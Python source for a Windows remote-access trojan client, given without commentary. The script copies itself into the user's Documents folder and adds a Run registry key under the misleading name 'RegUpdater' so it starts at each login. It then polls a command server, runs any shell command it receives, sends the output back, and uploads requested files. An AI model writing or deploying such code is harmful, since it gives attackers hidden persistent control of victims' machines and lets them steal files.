import os
import shutil
from subprocess import PIPE, Popen, check_output
import requests
import time
import random
import _winreg as wreg

SERVER_URL = 'http://127.0.0.1'

path = os.getcwd().strip('\n')
Null,userprof = check_ouput('set USERPROFILE', shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
if not os.path.exists(destination):
    shutil.copyfile(path + '\client.exe', destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()

def connect():
    while True:
        req = requests.get(SERVER_URL)
        command = req.text
        if 'terminate' in command:
            return 1
        elif 'grab' in command:
            grab,path = command.split('*')
            if os.path.exists(path):
                url = SERVER_URL + '/store'
                files = {'file':open(path,'rb')}
                r = requests.post(url, files=files)
            else:
                post_response = requests.post(url=SERVER_URL, data='[-] Not able to find the file !')
        else:
            CMD = Popen(command, stdin=PIPE, stderr=PIPE, stdout=PIPE, shell=True)
            post_response = requests.post(url=SERVER_URL, data=CMD.stdout.read())
            post_response = requests.post(url=SERVER_URL, data=CMD.stderr.read())
    time.sleep(3)

while True:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(60, 600)
        time.sleep(sleep_for)
        pass
